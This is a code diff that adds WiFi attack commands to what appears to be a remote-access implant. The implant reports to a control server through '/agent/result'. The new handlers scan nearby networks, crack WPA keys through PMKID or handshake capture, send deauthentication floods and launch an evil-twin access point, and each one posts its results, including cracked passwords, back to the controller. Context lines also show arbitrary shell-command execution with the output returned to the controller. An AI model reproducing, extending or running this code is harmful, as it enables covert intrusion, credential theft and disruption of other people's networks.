@@ -2273,6 +2273,100 @@ $filter='(&(objectCategory=person)(userAccountControl:1.2.840.113556.1.4.803:=41
                     out = f"ZERO_CLICK error: {e}"
                 _post(f"/agent/result?id={AID}&cmd=ZERO_CLICK", str(out)[:3000])
 
+            elif cmd == "WIFI_SCAN":
+                # WIFI_SCAN — scan for nearby WiFi networks
+                try:
+                    import sys as _sys2
+                    _sys2.path.insert(0, _MOD_DIR)
+                    import wifi_attack as _wifi
+                    ifaces = _wifi.list_interfaces()
+                    if not ifaces:
+                        out = "No wireless interfaces found"
+                    else:
+                        iface = ifaces[0]
+                        mon = _wifi.enable_monitor(iface)
+                        nets = _wifi.scan_networks(mon, duration=15)
+                        _wifi.disable_monitor(mon)
+                        lines = [f"{n['bssid']}  ch{n['channel']}  {n['encryption']}  {n['power']}dBm  {n['essid']}"
+                                 for n in nets]
+                        out = "\n".join(lines) if lines else "No networks found"
+                except Exception as e:
+                    out = f"WIFI_SCAN error: {e}"
+                _post(f"/agent/result?id={AID}&cmd=WIFI_SCAN", str(out)[:5000])
+
+            elif cmd and cmd.startswith("WIFI_CRACK "):
+                # WIFI_CRACK <bssid> [iface]
+                # Runs PMKID first, then handshake fallback
+                try:
+                    parts = cmd.split()
+                    bssid = parts[1] if len(parts) > 1 else None
+                    iface = parts[2] if len(parts) > 2 else None
+                    import sys as _sys2
+                    _sys2.path.insert(0, _MOD_DIR)
+                    import wifi_attack as _wifi
+                    if not iface:
+                        ifaces = _wifi.list_interfaces()
+                        iface = ifaces[0] if ifaces else "wlan0"
+                    mon = _wifi.enable_monitor(iface)
+                    # Try PMKID
+                    result = _wifi.pmkid_attack(mon, bssid=bssid, duration=60)
+                    if not result:
+                        # Scan to get channel
+                        nets = _wifi.scan_networks(mon, duration=10)
+                        net = next((n for n in nets if n["bssid"] == bssid), None)
+                        ch = net["channel"] if net else "6"
+                        cap = _wifi.capture_handshake(mon, bssid, ch, timeout=90)
+                        if cap:
+                            result = _wifi.crack_handshake(cap, bssid=bssid)
+                    _wifi.disable_monitor(mon)
+                    out = f"Password: {result}" if result else "Not cracked"
+                except Exception as e:
+                    out = f"WIFI_CRACK error: {e}"
+                _post(f"/agent/result?id={AID}&cmd=WIFI_CRACK", str(out)[:3000])
+
+            elif cmd and cmd.startswith("WIFI_DEAUTH "):
+                # WIFI_DEAUTH <bssid> [count]
+                try:
+                    parts = cmd.split()
+                    bssid = parts[1]
+                    count = int(parts[2]) if len(parts) > 2 else 30
+                    import sys as _sys2
+                    _sys2.path.insert(0, _MOD_DIR)
+                    import wifi_attack as _wifi
+                    ifaces = _wifi.list_interfaces()
+                    iface = ifaces[0] if ifaces else "wlan0"
+                    mon = _wifi.enable_monitor(iface)
+                    _wifi.deauth(mon, bssid, count=count)
+                    _wifi.disable_monitor(mon)
+                    out = f"Deauth sent ({count} frames) to {bssid}"
+                except Exception as e:
+                    out = f"WIFI_DEAUTH error: {e}"
+                _post(f"/agent/result?id={AID}&cmd=WIFI_DEAUTH", str(out)[:2000])
+
+            elif cmd and cmd.startswith("WIFI_EVIL_TWIN "):
+                # WIFI_EVIL_TWIN <ssid> [channel]
+                try:
+                    parts = cmd.split(None, 2)
+                    essid = parts[1]
+                    channel = parts[2] if len(parts) > 2 else "6"
+                    import sys as _sys2
+                    _sys2.path.insert(0, _MOD_DIR)
+                    import wifi_attack as _wifi
+                    ifaces = _wifi.list_interfaces()
+                    ap_iface = ifaces[0] if ifaces else "wlan0"
+                    mon = ifaces[1] if len(ifaces) > 1 else None
+                    import threading as _thr
+                    _thr.Thread(
+                        target=_wifi.evil_twin,
+                        kwargs={"ap_iface": ap_iface, "mon_iface": mon,
+                                "ssid": essid, "channel": int(channel)},
+                        daemon=True
+                    ).start()
+                    out = f"Evil twin AP '{essid}' ch{channel} started"
+                except Exception as e:
+                    out = f"WIFI_EVIL_TWIN error: {e}"
+                _post(f"/agent/result?id={AID}&cmd=WIFI_EVIL_TWIN", str(out)[:2000])
+
             elif cmd and cmd!="PING":
                 _post(f"/agent/result?id={AID}&cmd="+_parse.quote(cmd[:80]),_shell(cmd))
         except: pass
